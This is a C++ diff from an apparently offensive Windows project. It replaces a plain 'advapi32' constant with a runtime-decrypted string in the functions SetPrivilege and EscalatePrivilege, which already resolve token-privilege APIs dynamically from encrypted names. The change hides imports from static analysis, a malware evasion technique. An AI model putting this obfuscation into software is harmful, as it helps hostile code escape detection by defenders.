@@ -14,7 +14,7 @@ bool SetPrivilege(
 	LUID luid;
 
 	// Retrieve the LUID for the specified privilege
-	if (!resolve_dynamically<LookupPrivilegeValueA_t>(string_decrypt(str_LookupPrivilegeValueA, str_LookupPrivilegeValueA_len).c_str(), ADVAPI32_STR)(
+	if (!resolve_dynamically<LookupPrivilegeValueA_t>(string_decrypt(str_LookupPrivilegeValueA, str_LookupPrivilegeValueA_len).c_str(), string_decrypt_cstr(str_advapi32, str_advapi32_len))(
 		NULL,            // Lookup privilege on the local system
 		lpszPrivilege,   // Privilege to lookup
 		&luid))			 // Receives the LUID of the privilege
@@ -28,7 +28,7 @@ bool SetPrivilege(
 	tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;
 
 	// Enable or disable the privilege in the access token
-	if (!resolve_dynamically<AdjustTokenPrivileges_t>(string_decrypt(str_AdjustTokenPrivileges, str_AdjustTokenPrivileges_len).c_str(), ADVAPI32_STR)(
+	if (!resolve_dynamically<AdjustTokenPrivileges_t>(string_decrypt(str_AdjustTokenPrivileges, str_AdjustTokenPrivileges_len).c_str(), string_decrypt_cstr(str_advapi32, str_advapi32_len))(
 		hToken,
 		FALSE,
 		&tp,
@@ -54,7 +54,7 @@ int EscalatePrivilege()
 {
 	HANDLE hToken;
 
-	auto OpenProcessTokenFunc = resolve_dynamically<OpenProcessToken_t>(string_decrypt(str_OpenProcessToken, str_OpenProcessToken_len).c_str(), ADVAPI32_STR);
+	auto OpenProcessTokenFunc = resolve_dynamically<OpenProcessToken_t>(string_decrypt(str_OpenProcessToken, str_OpenProcessToken_len).c_str(), string_decrypt_cstr(str_advapi32, str_advapi32_len));
 	auto GetCurrentProcessFunc = resolve_dynamically<GetCurrentProcess_t>(string_decrypt(str_GetCurrentProcess, str_GetCurrentProcess_len).c_str());
 
 	// Open the access token associated with the current process
